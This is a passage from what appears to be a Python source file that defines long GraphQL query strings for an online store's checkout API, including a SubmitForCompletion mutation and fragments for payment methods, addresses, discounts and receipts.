InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}"""
 
 MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle 